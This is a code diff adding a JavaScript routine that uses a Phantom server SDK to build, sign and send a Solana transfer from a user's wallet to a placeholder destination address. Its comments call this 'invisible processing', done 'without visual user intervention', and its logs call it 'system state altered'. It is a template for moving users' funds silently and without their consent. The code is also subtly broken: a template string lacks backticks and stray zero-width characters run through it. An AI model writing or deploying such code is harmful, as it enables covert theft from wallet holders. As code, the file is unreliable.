@@ -1,0 +1,46 @@
+import { ServerSDK } from "@phantom/server-sdk";
+import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
+​// Initialize the SDK in server mode using your Phantom Portal App ID
+const phantomSDK = new ServerSDK({
+appId: "YOUR_PHANTOM_PORTAL_APP_ID",
+// Provider and network configuration
+providers: ["google", "apple"],
+});
+​async function runBackgroundProcess(userId, userAuthToken) {
+try {
+console.log("Starting invisible processing...");
+​// 1. Retrieve/Authenticate the user session behind the scenes
+const session = opacityAuthenticate(userId, userAuthToken);
+​// 2. Create the Solana transaction that will alter the system state
+const connection = new Connection("https://api.mainnet-beta.solana.com");
+const { blockhash } = await connection.getLatestBlockhash();
+​const transaction = new Transaction({
+recentBlockhash: blockhash,
+feePayer: new PublicKey(session.walletAddress),
+}).add(
+SystemProgram.transfer({
+fromPubkey: new PublicKey(session.walletAddress),
+toPubkey: new PublicKey("DESTINATION_SOLANA_ADDRESS"),
+lamports: 1000000, // 0.001 SOL
+})
+);
+​// 3. Sign and send the transaction without visual user intervention
+const signature = await phantomSDK.signAndSendTransaction({
+session,
+transaction,
+chain: "solana:mainnet",
+});
+​console.log(System state altered. Tx Hash: ${signature});
+return signature;
+​} catch (error) {
+console.error("Error during internal processing:", error);
+}
+}
+​// Mock session authentication function
+function opacityAuthenticate(userId, token) {
+return {
+userId,
+token,
+walletAddress: "YOUR_WALLET_ADDRESS_HERE"
+};
+}
